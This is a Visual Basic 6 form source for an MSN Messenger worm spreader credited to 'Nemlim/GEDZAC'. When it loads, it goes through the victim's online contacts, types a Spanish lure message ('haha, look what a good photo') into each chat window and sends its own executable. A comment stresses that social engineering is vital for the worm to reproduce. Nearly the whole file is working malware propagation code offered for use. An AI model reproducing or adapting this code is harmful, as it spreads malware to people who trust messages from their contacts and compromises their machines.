VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "www.gedzac.tk"
   ClientHeight    =   3195
   ClientLeft      =   3420
   ClientTop       =   2595
   ClientWidth     =   4680
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   Begin VB.Label Label1 
      Caption         =   "MSN Spread by Nemlim/GEDZAC"
      ForeColor       =   &H00E0E0E0&
      Height          =   195
      Left            =   2100
      TabIndex        =   0
      Top             =   2940
      Width           =   2595
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const msnOnline = 2
Const msnOffline = 1
Private Sub Form_Load()
On Error Resume Next
Dim w As Object, iMsn As Object, ConTacto As Object
Set w = CreateObject("Messenger.UIAutomation")
    For Each ConTacto In w.MyContacts
        If ConTacto.Status = msnOnline Then
            Set iMsn = w.InstantMessage(ConTacto.SigninName)
            Call SpamMsn(iMsn.hwnd)
        End If
    Next
End Sub
Private Sub SpamMsn(ByVal mHwnd)
On Error Resume Next
Dim l As Long, spam As String
l = FindWindowEx(mHwnd, 0, "DirectUIHWND", vbNullString)
If l = 0 Then Exit Sub
'La ingenieria social es vital para que la reproduccion resulte exitosa
Call SendText(l, "jaja, mira que buena foto :P", False, True)
'Exit Sub
'DoEvents
EnviarFile App.Path & "\" & App.EXEName & ".exe", l
End Sub
Public Sub SendText(pIMWindow As Long, sText As String, Optional bSend As Boolean = False, Optional bKeepFocus As Boolean = True)
Dim hDirectUI As Long, hPrevWnd As Long
Dim i As Integer
hDirectUI = pIMWindow
hPrevWnd = GetForegroundWindow
Do
    Call SetForegroundWindow(hDirectUI)
Loop Until GetForegroundWindow = hDirectUI

For i = 1 To Len(sText)
    Call PostMessage(hDirectUI, WM_CHAR, Asc(Mid(sText, i, 1)), 0&)
Next i
If bSend Then
    Call PostMessage(hDirectUI, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(hDirectUI, WM_KEYUP, VK_RETURN, 0&)
End If
If Not bKeepFocus Then
    Call SetForegroundWindow(hPrevWnd)
End If
End Sub
